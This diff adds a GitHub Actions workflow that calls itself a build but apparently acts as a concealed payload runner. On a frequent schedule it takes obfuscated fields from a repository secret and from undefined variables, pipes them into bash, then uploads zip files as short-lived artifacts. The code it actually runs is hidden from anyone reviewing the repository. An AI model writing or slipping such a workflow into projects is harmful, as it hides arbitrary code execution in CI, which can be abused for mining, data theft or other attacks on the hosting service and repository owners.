@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          x0: ${{ secrets.x0 }}
+        run: |
+          printf '%s' "$x0" | jq -r .ad281 | /bin/bash
+          echo $w00462 | jq -r .hpt5 | /bin/bash
+          echo $l5 | jq -r .alke33522 | /bin/bash
+          echo $ramcg864 | jq -r .dkw3035 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: zcdGZraC
+          path: "*.zip"
+          retention-days: 1
